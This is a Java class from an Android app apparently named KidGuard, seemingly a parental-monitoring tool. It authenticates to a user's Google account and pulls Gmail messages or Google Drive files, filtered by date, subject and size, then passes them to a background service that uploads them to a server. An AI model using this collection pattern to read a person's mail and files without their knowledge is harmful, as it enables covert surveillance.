package com.kidguard.services;

import android.Manifest;
import android.content.Context;

import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.util.ExponentialBackOff;
import com.google.api.services.drive.Drive;
import com.kidguard.MainActivity;
import com.kidguard.R;
import com.kidguard.asynctask.MakeRequestDrive;
import com.kidguard.asynctask.MakeRequestEmail;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.GoogleDrive;
import com.kidguard.model.Mail;
import com.kidguard.preference.Preference;

import java.util.ArrayList;
import java.util.Arrays;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;

public class GoogleAccountService implements Constant {
    private GoogleAccountCredential mCredential;
    private String tag;
    private String count;
    private String dateFrom;
    private String dateTo;
    private String subject;
    private String size;
    private Context ctx;

    // Default Constructor
    public GoogleAccountService(Context ctx, String getAccountStr) {
        this.ctx = ctx;
        if (getAccountStr != null && !getAccountStr.equals("")) {
            getGoogleAccount();
        }
    }

    // GoogleAccountService Constructor
    public GoogleAccountService(Context ctx, String tag, String count, String dateFrom, String dateTo, String subject, String size) {
        this.ctx = ctx;
        if (tag != null && !tag.equals("")) {
            this.tag = tag;
            this.count = count;
            this.dateFrom = dateFrom;
            this.dateTo = dateTo;
            this.subject = subject;
            this.size = size;
        }
        getGoogleAccount();
    }

    // Get Google Account
    private void getGoogleAccount() {
        if (tag != null) {
            if (tag.equals(TAG_EMAIL)) {
                mCredential = GoogleAccountCredential.usingOAuth2(ctx.getApplicationContext(), Arrays.asList(SCOPES_GMAIL)).setBackOff(new ExponentialBackOff());
            } else {
                mCredential = GoogleAccountCredential.usingOAuth2(ctx.getApplicationContext(), Arrays.asList(SCOPES_GOOGLE_DRIVE)).setBackOff(new ExponentialBackOff());
            }
        } else {
            mCredential = GoogleAccountCredential.usingOAuth2(ctx.getApplicationContext(), Arrays.asList(SCOPES_GMAIL)).setBackOff(new ExponentialBackOff());
        }

        getResultsFromApi();
    }

    // Get Results From Api
    private void getResultsFromApi() {
        if (mCredential.getSelectedAccountName() == null) {
            chooseAccount();
        } else {
            if (tag != null && !tag.equals("")) {
                if (tag.equals(TAG_EMAIL)) {
                    new MakeRequestEmail(ctx, mCredential, count, dateFrom, dateTo, subject).execute();
                } else {
                    new MakeRequestDrive(ctx, mCredential, count, dateFrom, dateTo, subject, size).execute();
                }
            }
        }
    }

    @AfterPermissionGranted(REQUEST_PERMISSION_GET_ACCOUNTS)
    private void chooseAccount() {
        if (EasyPermissions.hasPermissions(ctx, Manifest.permission.GET_ACCOUNTS)) {
            String accountName = Preference.getAccountName(ctx);
            if (accountName != null) {
                mCredential.setSelectedAccountName(accountName);
                getResultsFromApi();
            } else {
                if (MainActivity.getInstance() != null) {
                    // Start a dialog from which the user can choose an account
                    MainActivity.getInstance().startActivityForResult(mCredential.newChooseAccountIntent(), REQUEST_ACCOUNT_PICKER);
                }
            }
        } else {
            if (MainActivity.getInstance() != null) {
                // Request the GET_ACCOUNTS permission via a user dialog
                EasyPermissions.requestPermissions(MainActivity.getInstance(), ctx.getString(R.string.getAccountMsg), REQUEST_PERMISSION_GET_ACCOUNTS, Manifest.permission.GET_ACCOUNTS);
            }
        }
    }

    // Send EMAIL Data To Server
    public void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
        new BackgroundDataService(ctx).sendEmailDataToServer(lstEmail);
    }

    // Send Google Drive Data To Server
    public void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
        new BackgroundDataService(ctx).sendGoogleDriveDataToServer(lstDrive, mDrive);
    }

    // Get Google Credentials
    public GoogleAccountCredential getGoogleCredentials() {
        return mCredential;
    }
}
